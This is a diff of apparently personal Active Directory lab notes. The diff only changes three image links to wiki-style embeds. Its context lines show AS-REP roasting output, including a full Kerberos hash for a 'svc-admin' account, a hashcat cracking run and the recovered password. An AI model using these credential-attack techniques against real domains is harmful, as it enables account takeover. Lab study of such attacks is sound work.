@@ -237,7 +237,7 @@ Version: v1.0.3 (9dad6e1) - 05/24/26 - Ronnie Flathers @ropnop
 
 ## Kerbrute
 
-![](../../../../assets/images/Pasted%20image%2020260524045335.png)
+![[Pasted image 20260524045335.png]]
 
 ## AS-REP Roast
 
@@ -251,7 +251,7 @@ Password:
 [*] Cannot authenticate svc-admin, getting its TGT
 $krb5asrep$23$svc-admin@THM-AD:f3e18b69dda06e33d6d11c3fc92685f3$4e27cdbad0ca885b633b63db1656cc14c39bec5776ecc07d5f267b6af37cd30a49861f02746d9d2469db6a56aa0b173a30e6753e2277e6bfc43f1afd1bbf19c76c8736701d0c3237278cc0f4de11e6c86f3d918a558d0fd1f59982ff0da57531f7c295ee2ab7119f1481943e695e3cc7b70268cc2360cdf6baeddcccbe05b07dca9d25f3e81b26cce0ef0a7eb0e38e3fe5370e64e8c253d651ed53549aea556c45094843576782057568cffab0ba752e644a9c129100836132c0c002f681d89293bf1a408f7ea62375d3106fd524b33bdd9a5868a82b2ee7af0911c18c8b3f86e7b40a0d03e94ab6a0
 ```
-![](../../../../assets/images/Pasted%20image%2020260524045534.png)
+![[Pasted image 20260524045534.png]]
 
 https://hashcat.net/wiki/doku.php?id=example_hashes
 
@@ -319,7 +319,7 @@ Hardware.Mon.#01.: Util:  8%
 Started: Sun May 24 04:17:24 2026
 Stopped: Sun May 24 04:18:03 2026
 ```
-![](../../../../assets/images/Pasted%20image%2020260524045623.png)
+![[Pasted image 20260524045623.png]]
 management2005
 
 ```zsh
